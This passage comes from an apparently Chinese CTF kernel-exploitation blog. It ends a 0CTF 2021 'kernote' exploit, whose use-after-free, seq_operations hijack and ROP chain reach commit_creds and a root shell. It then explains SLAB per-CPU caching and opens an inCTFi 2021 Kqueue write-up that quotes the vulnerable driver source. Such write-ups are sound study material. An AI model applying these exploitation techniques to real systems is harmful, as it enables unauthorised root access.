    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"creating UAF..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>seq_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"open stat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> <span class="token number">0xffffffff810b345b</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// add rsp, 0x190 ; pop, pop, pop ; ret</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hijack seq operation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// pt_regs rsp offset 0x198</span>
    <span class="token function">__asm__</span><span class="token punctuation">(</span>
        <span class="token string">"mov r15,   0xbeefdead;"</span>
        <span class="token string">"mov r14,   0x11111111;"</span>
        <span class="token string">"mov r13,   pop_rdi_ret;"</span> 
        <span class="token string">"mov r12,   init_cred;"</span> <span class="token comment">// start at here</span>
        <span class="token string">"mov rbp,   commit_creds;"</span>
        <span class="token string">"mov rbx,   swapgs_restore_regs_and_return_to_usermode;"</span>
        <span class="token string">"mov r11,   0x66666666;"</span>
        <span class="token string">"mov r10,   0x77777777;"</span>
        <span class="token string">"mov r9,    0x88888888;"</span>
        <span class="token string">"mov r8,    0x99999999;"</span>
        <span class="token string">"xor rax,   rax;"</span>
        <span class="token string">"mov rcx,   0xaaaaaaaa;"</span>
        <span class="token string">"mov rdx,   8;"</span>
        <span class="token string">"mov rsi,   rsp;"</span>
        <span class="token string">"mov rdi,   seq_fd;"</span>
        <span class="token string">"syscall"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="回到一切开始前"><a href="#回到一切开始前" class="headerlink" title="回到一切开始前"></a>回到一切开始前</h2><p>在 leak 和 劫持 seq_operations 时有一个小细节，就是因为 <strong>SLAB_FREELIST_RANDOM</strong> 的开启，无法预测从 free_list 中分配到 object</p>
<p>exp 中下面怎么可以确定新分配的 ldt_struct 就一定是刚释放的 object 呢？</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先的猜想是 free_list 只有这么一个 object，随后我尝试了在 exp 开头通过 <code>fd = open(&quot;/proc/self/stat&quot;); close(fd);</code> 构造多个 seq_operations 并释放，最后发现 exp 仍可以正常 leak，看样子不是这个问题</p>
<p>最后求助于源码，发现 slab 分配器在分配和释放时存在一个 cpu cache，分配和释放都会先操作这个 cache</p>
<p>在调用 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/mm/slab.c#L3031"><code>____cache_alloc</code></a> 时，可以发现 object 从 cpu cache 中分配</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">____cache_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> <span class="token class-name">gfp_t</span> flags<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac<span class="token punctuation">;</span>

	<span class="token function">check_irq_off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>ac<span class="token operator">-></span>avail<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ac<span class="token operator">-></span>touched <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		objp <span class="token operator">=</span> ac<span class="token operator">-></span>entry<span class="token punctuation">[</span><span class="token operator">--</span>ac<span class="token operator">-></span>avail<span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token function">STATS_INC_ALLOCHIT</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">return</span> objp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放时，当 cpu_cache 满了，调用 <code>cache_flusharray</code> 把 cpu_cache 里的 object 扔到 slab free_list 里，最后再把当前要释放的 object 扔到 cpu_cache 里</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">___cache_free</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">,</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac <span class="token operator">=</span> <span class="token function">cpu_cache_get</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>ac<span class="token operator">-></span>avail <span class="token operator">&lt;</span> ac<span class="token operator">-></span>limit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">STATS_INC_FREEHIT</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token function">STATS_INC_FREEMISS</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">cache_flusharray</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> ac<span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token function">__free_one</span><span class="token punctuation">(</span>ac<span class="token punctuation">,</span> objp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token function">__free_one</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token operator">*</span>ac<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">/* Avoid trivial double-free. */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IS_ENABLED</span><span class="token punctuation">(</span>CONFIG_SLAB_FREELIST_HARDENED<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
	    <span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span>ac<span class="token operator">-></span>avail <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ac<span class="token operator">-></span>entry<span class="token punctuation">[</span>ac<span class="token operator">-></span>avail <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> objp<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	ac<span class="token operator">-></span>entry<span class="token punctuation">[</span>ac<span class="token operator">-></span>avail<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> objp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>所以在这个过程中，分配的 object 一定是最后一次释放的 object，没有受到 SLAB_FREELIST_RANDOM 的影响</p>
<p>于此同时也可以看到，slab 分配器的 SLAB_FREELIST_HARDENED 机制不同于文章开头对于 slub 分配器该机制描述的那样，更具体的内容可以自行查阅源码</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文中未明确提到的参考链接如下：</p>
<ol>
<li><a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote">https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote</a></li>
<li><a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></li>
<li><a href="https://www.anquanke.com/post/id/200161">https://www.anquanke.com/post/id/200161</a></li>
<li><a href="https://cateee.net/lkddb/web-lkddb/HARDENED_USERCOPY.html">https://cateee.net/lkddb/web-lkddb/HARDENED_USERCOPY.html</a></li>
<li><a href="https://blog.csdn.net/pwl999/article/details/112055498">https://blog.csdn.net/pwl999/article/details/112055498</a></li>
</ol>
]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-inCTFi-Kqueue</title>
    <url>/f6f424b7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>去年参加的一场 CTF，当时不怎么会 kernel，现在想深入学习下 kernel，回过头来看看这道题</p>
<span id="more"></span>

<h2 id="环境-amp-一些问题"><a href="#环境-amp-一些问题" class="headerlink" title="环境 &amp; 一些问题"></a>环境 &amp; 一些问题</h2><p>题目的附件可以在<a href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue">官方题目仓库</a>里找到</p>
<p>需要注意的几件事情：</p>
<ol>
<li>题目的环境是用 buildroot，登陆用户名是 <code>ctf</code>，密码是 <code>kqueue</code>（可以在官方的 exp.py 里面找到）</li>
<li>解包/重新打包 rootfs.cpio 的时候记得用 <strong>root</strong> 权限，不然启动的时候会有奇奇怪怪的权限或者文件丢失的问题</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>qemu 启动参数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token builtin class-name">exec</span> qemu-system-x86_64 <span class="token punctuation">\</span>
    -cpu kvm64 <span class="token punctuation">\</span>
    -m <span class="token number">512</span> <span class="token punctuation">\</span>
    -nographic <span class="token punctuation">\</span>
    -kernel <span class="token string">"bzImage"</span> <span class="token punctuation">\</span>
    -append <span class="token string">"console=ttyS0 panic=-1 pti=off kaslr quiet"</span> <span class="token punctuation">\</span>
    -monitor /dev/null <span class="token punctuation">\</span>
    -initrd <span class="token string">"./rootfs.cpio.pack"</span> <span class="token punctuation">\</span>
    -net user <span class="token punctuation">\</span>
    -net nic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开启了 kaslr，关闭了 kpti，而且还没开启 SMAP，SMEP，意味着内核可以访问用户空间代码和数据，可以 ret2usr</p>
<p>内核模块直接提供了源码</p>
<p>题目创建了一个设备，可以对这个设备进行 ioctl 调用</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">miscdevice</span> kqueue_device <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">.</span>minor <span class="token operator">=</span> MISC_DYNAMIC_MINOR<span class="token punctuation">,</span>
    <span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"kqueue"</span><span class="token punctuation">,</span>
    <span class="token punctuation">.</span>fops <span class="token operator">=</span> <span class="token operator">&amp;</span>kqueue_fops<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ioctl 通过一个 <code>request_t</code> 结构体进行传参</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> entry_idx<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>此外通过 <code>cmd</code> 参数分别实现管理多个队列的增删改查</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">kqueue_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">long</span> result<span class="token punctuation">;</span>

    <span class="token class-name">request_t</span> request<span class="token punctuation">;</span>
    
    <span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>operations_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>request<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] copy_from_user failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">switch</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> CREATE_KQUEUE<span class="token operator">:</span>
            result <span class="token operator">=</span> <span class="token function">create_kqueue</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> DELETE_KQUEUE<span class="token operator">:</span>
            result <span class="token operator">=</span> <span class="token function">delete_kqueue</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> EDIT_KQUEUE<span class="token operator">:</span>
            result <span class="token operator">=</span> <span class="token function">edit_kqueue</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> SAVE<span class="token operator">:</span>
            result <span class="token operator">=</span> <span class="token function">save_kqueue_entries</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
            result <span class="token operator">=</span> INVALID<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
ret<span class="token operator">:</span> 
    <span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>operations_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>队列的存储结构体如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> queue_size<span class="token punctuation">;</span> <span class="token comment">/* This needs to handle larger numbers */</span>
    <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> idx<span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>queue<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint16_t</span> idx<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
    queue_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>create 操作：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">long</span> <span class="token function">create_kqueue</span><span class="token punctuation">(</span><span class="token class-name">request_t</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> result <span class="token operator">=</span> INVALID<span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>queueCount <span class="token operator">></span> MAX_QUEUES<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Max queue count reached"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* You can't ask for 0 queues , how meaningless */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] kqueue entries should be greater than 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Asking for too much is also not good */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size<span class="token operator">></span>MAX_DATA_SIZE<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] kqueue data size exceed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Initialize kqueue_entry structure */</span>
    queue_entry <span class="token operator">*</span>kqueue_entry<span class="token punctuation">;</span>

    <span class="token comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span>
    ull space <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_umulll_overflow</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue_entry<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>space<span class="token punctuation">)</span> <span class="token operator">==</span> true<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Integer overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Size is the size of queue structure + size of entry * request entries */</span>
    ull queue_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_saddll_overflow</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">,</span>space<span class="token punctuation">,</span><span class="token operator">&amp;</span>queue_size<span class="token punctuation">)</span> <span class="token operator">==</span> true<span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Integer overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Total size should not exceed a certain limit */</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>queue_size<span class="token operator">></span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">)</span>
        <span class="token function">err</span><span class="token punctuation">(</span><span class="token string">"[-] Max kqueue alloc limit reached"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* All checks done , now call kzalloc */</span>
    queue <span class="token operator">*</span>queue <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>queue_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Main queue can also store data */</span>
    queue<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data_size<span class="token punctuation">,</span>GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Fill the remaining queue structure */</span>
    queue<span class="token operator">-></span>data_size   <span class="token operator">=</span> request<span class="token punctuation">.</span>data_size<span class="token punctuation">;</span>
    queue<span class="token operator">-></span>max_entries <span class="token operator">=</span> request<span class="token punctuation">.</span>max_entries<span class="token punctuation">;</span>
    queue<span class="token operator">-></span>queue_size  <span class="token operator">=</span> queue_size<span class="token punctuation">;</span>

    <span class="token comment">/* Get to the place from where memory has to be handled */</span>
    kqueue_entry <span class="token operator">=</span> <span class="token punctuation">(</span>queue_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span>queue <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* Allocate all kqueue entries */</span>
    queue_entry<span class="token operator">*</span> current_entry <span class="token operator">=</span> kqueue_entry<span class="token punctuation">;</span>
    queue_entry<span class="token operator">*</span> prev_entry <span class="token operator">=</span> current_entry<span class="token punctuation">;</span>

    <span class="token class-name">uint32_t</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>request<span class="token punctuation">.</span>max_entries<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">!=</span>request<span class="token punctuation">.</span>max_entries<span class="token punctuation">)</span>
            prev_entry<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        current_entry<span class="token operator">-></span>idx <span class="token operator">=</span> i<span class="token punctuation">;</span>
